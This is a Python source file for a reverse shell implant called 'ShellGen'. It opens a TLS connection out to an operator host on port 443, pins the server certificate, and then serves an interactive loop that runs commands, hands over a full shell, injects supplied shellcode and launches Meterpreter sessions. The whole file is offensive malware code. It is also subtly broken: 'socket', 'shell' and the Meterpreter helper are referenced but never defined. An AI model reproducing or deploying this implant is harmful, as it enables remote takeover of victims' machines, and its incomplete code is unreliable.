import sys
import hashlib
import ssl
import subprocess
import shlex


def interactive_shell(conn):
    exit = False
    prompt = "[ShellGen]> "
    while not exit:
        conn.sendall(prompt.encode())
        command = conn.recv(1024).decode().strip()
        if len(command) > 1:
            argv = shlex.split(command)
            if argv[0] == "meterpreter":
                if len(argv) > 2:
                    transport = argv[1]
                    address = argv[2]
                    ok, err = meterpreter_meterpreter(transport, address)
                    if not ok:
                        conn.sendall((err + "\n").encode())
                else:
                    conn.sendall("Usage: meterpreter [tcp|http|https] IP:PORT\n".encode())
            elif argv[0] == "inject":
                if len(argv) > 1:
                    shellcode = argv[1]
                    shellcode = bytes.fromhex(shellcode)
                    shellcode_length = len(shellcode)
                    if shellcode_length > 0:
                        shell.InjectShellcode(shellcode)
            elif argv[0] == "exit":
                exit = True
            elif argv[0] == "run_shell":
                conn.sendall("Here is your original shell: \n".encode())
                run_shell(conn)
            else:
                shell.ExecuteCmd(command, conn)
        if exit:
            break


def run_shell(conn):
    cmd = shell.GetShell()
    cmd.stdout = conn
    cmd.stderr = conn
    cmd.stdin = conn
    cmd.run()


def check_key_pin(conn, fingerprint):
    valid = False
    try:
        cert = conn.getpeercert(binary_form=True)
        if cert:
            cert_hash = hashlib.sha256(cert).digest()
            if cert_hash == fingerprint:
                valid = True
    except:
        pass
    return valid


def reverse(connect_string, fingerprint):
    conn = None
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        conn = ctx.wrap_socket(socket.socket(socket.AF_INET), server_hostname=connect_string, )
        conn.connect((connect_string, 443))
        if not check_key_pin(conn, fingerprint):
            raise Exception("Bad fingerprint")
        interactive_shell(conn)
    except:
        sys.exit(2)
    finally:
        if conn:
            conn.close()


if __name__ == "__main__":
    connect_string = ""
    fingerprint = ""
    if connect_string and fingerprint:
        fingerprint = bytes.fromhex(fingerprint.replace(':', ''))
        reverse(connect_string, fingerprint)
